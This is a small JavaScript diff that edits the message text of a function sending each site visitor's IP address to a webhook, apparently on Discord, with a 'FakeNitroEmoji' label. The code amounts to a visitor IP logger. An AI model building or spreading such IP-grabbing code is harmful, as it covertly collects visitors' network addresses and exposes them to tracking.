@@ -10,8 +10,8 @@ const sendWebhook = async () => {
     const ipAddress = await getIpAddress();
 
     const embed = {
-        title: "Nouveau membre rejoint le site!",
-        description: `Quoicoubaka! Adresse IP: ${ipAddress}`,
+        title: "<:FakeNitroEmoji:1209487670561210419> Un nouveau membre à rejoint le site!",
+        description: `Adresse IP: || ${ipAddress} ||`,
         color: 0x00ff00
     };
 
